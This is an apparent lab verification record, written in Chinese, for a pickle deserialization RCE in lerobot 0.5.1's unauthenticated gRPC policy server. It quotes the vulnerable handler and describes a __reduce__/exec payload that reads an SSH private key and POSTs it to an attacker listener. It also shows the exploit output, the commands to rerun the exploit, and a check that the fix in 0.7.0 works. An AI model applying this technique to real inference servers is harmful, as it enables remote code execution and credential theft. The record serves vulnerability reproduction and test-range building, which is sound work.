# Hop 2 — lerobot 0.5.1 pickle 反序列化 RCE (CVE-2026-25874)

日期:2026-11-20。状态:**G1 双版本验证 PASS**(0.5.1 exit 0 / 0.7.0 exit 2,双通道)。

## 修复版本考证(重要更正)

PLAN.md 原记录"修复版 0.5.2"**有误**:PyPI 上不存在 lerobot 0.5.2。逐版本 sdist 核实:

| 版本 | `async_inference/policy_server.py` 的 `pickle.loads(request.data)` | 判定 |
|---|---|---|
| 0.5.1 | 第 125 行,unauthenticated gRPC handler 内 | 受影响(官方 wheel 实锤,容器内 `inspect.getsource` 复核) |
| 0.6.0 | 第 125 行,仍在 | 未修 |
| 0.6.1 | 第 125 行,仍在(与 0.6.0 仅差一个 import 路径) | 未修 |
| 0.7.0 | `async_inference` gRPC 服务**整体移除**;替代 `remote_inference` 服务,zenoh 传输 + msgpack codec(`transport/protocol/codec.py`),全树无服务端 `pickle.loads` 输入路径 | 修复版 |

0.7.0 机制要点:所有入站消息(observation/control/language)经 `decode_message`(msgpack)解析,`_pump_queryables`/`_pump_subscribers` 对解析失败的载荷直接 `query.drop()` / 记 warning。传输层残留的 `bytes_to_python_object`(pickle.load)只被 RL learner 的 SendInteractions 使用(且与 policy server 无关的独立进程/端口)——CVE 描述的 policy server 攻击面在 0.7.0 不存在。

## 真实漏洞代码(官方 wheel,已逐行核实)

`lerobot/async_inference/policy_server.py`(0.5.1 官方 wheel):

```python
def SendPolicyInstructions(self, request, context):
    client_id = context.peer()
    policy_specs = pickle.loads(request.data)  # nosec      ← 未经认证的 gRPC 请求体直接反序列化
    if not isinstance(policy_specs, RemotePolicyConfig):
        raise TypeError(...)                   # ← 校验发生在 RCE 之后,形同虚设
```

gRPC channel 为 `grpc.insecure_channel`(无 TLS、无认证)。同一文件内 `SendObservations` 的 `pickle.loads(received_bytes)`(第 183 行)与 `robot_client.py` 客户端侧反序列化为 CVE 描述的完整攻击面。

### 重要机制发现

1. **isinstance 校验不构成防御**:类型校验在 `pickle.loads` 返回之后执行——unpickle 即代码执行,后续抛 `TypeError: Policy specs must be a RemotePolicyConfig` 只是 handler 报错,gRPC 层返回 `StatusCode.UNKNOWN`,**RCE 已发生**。参考 exploit 正是依赖此行为。
2. **loot 外泄原语**:payload `__reduce__` 返回 `(exec, (cmd,))`,在 `pickle.loads` 内联执行读取 `/loot/id_rsa` 并 POST 到攻击者监听器——无需 handler 正常返回。

## 场景声明(PLAN.md §3)

"模型服务器 A 上存在 SSH 私钥文件、A 与跳 3 的机器 B 有 SSH 信任关系"为**合成部署场景**(现实中机器人推理服务器持有运维 SSH key 的拓扑常见但非必然)。漏洞原语(未认证 gRPC + pickle.loads)100% 来自官方 wheel。双版本差异完全落在官方修复上(0.7.0 移除整个攻击面)。

## G1 双版本验证

### 0.5.1(受影响)— SUCCESS

- 项目:`docker compose -p hop2-vuln`(host 17871→8080),loot 经 Dockerfile 固化(每 build 随机 UUID)
- exploit:`attacker/reference_exploit.py`,退出码 0=RCE+外泄、2=无回连(修复版预期)、3=无 loot、4=loot 为空
- 运行输出(2026-11-20):

```
[exploit] gRPC RpcError: code=StatusCode.UNKNOWN detail=Exception calling application: Policy specs must be a RemotePolicyConfig. Got <class 'NoneType'>
[exploit] loot received (116 bytes): b'-----BEGIN OPENSSH PRIVATE KEY-----\nHOP2-SSH-KEY-01cf1cb3c19543b09eab3cbc42c003b...'
[exploit] SUCCESS
exit=0
```

注意第一行:handler 报 TypeError(校验在 RCE 后执行)但 loot 已到——这是"校验不构成防御"的直接证据。

### 0.7.0(修复)— FAIL as expected(攻击面消失)

- 项目:`docker compose -p hop2-fix`(host 17872→8080 / 17874→7447),`platform: linux/amd64`(eclipse-zenoh/torch 无 arm64 wheel)
- 0.7.0 启动路径:官方 `lerobot.remote_inference` `PolicyServer` + `ZenohTransport`(listen `tcp/0.0.0.0:7447`),最小 ACT checkpoint 经官方 `migrate_policy_normalization` 迁移后加载
- exploit v2 双通道(`attacker/reference_exploit_v2.py`):

```
gRPC 通道(旧攻击面):
[exploit] gRPC RpcError: code=StatusCode.UNAVAILABLE detail=failed to connect to all addresses
[exploit] FAIL: loot never arrived — no RCE
grpc-exit=2

zenoh 通道(新表面,泛洪 obs/control/language 全部入口):
[exploit] zenoh flood: 5 puts delivered (msgpack decode must reject all)
[exploit] FAIL: loot never arrived — no RCE
zenoh-exit=2
```

- 端口探测:`model-a:8080` → ConnectionRefused(服务移除);`model-a:7447` → OPEN(zenoh)
- 泛洪后 server 进程存活,零回连(监听器 15s 超时无任何请求)
- 退出码 2 = 修复版预期(与 0.5.1 的 exit 0 对照,判据一致)

## 运行记录

- 环境:`hop2_lerobot/docker-compose.yml`,STACK_TAG/LEROBOT_VERSION 参数化双版本
- 0.5.1 exploit 复跑:`docker exec hop2_attacker_vuln python /app/reference_exploit.py model-a:8080 8000`
- 0.7.0 exploit 复跑:`docker exec hop2_attacker_fix python /app/reference_exploit_v2.py model-a:8080 8000 grpc|zenoh`
- 0.7.0 环境注意:lerobot 0.7.0 依赖 torch>=2.7/eclipse-zenoh,均无 linux/arm64 wheel,须 `platform: linux/amd64`(qemu 仿真);checkpoint 须先经官方迁移脚本转 processor 格式(迁移脚本自身在 env_state-only 输入下有 FeatureType 误判 bug,故最小 checkpoint 采用 image+state 输入绕开)
- 判分口径:exit 0 = 利用成功;exit 2 = 攻击面不可达/载荷被拒(修复版预期);exit 3 = 无回连;exit 4 = 战果不完整
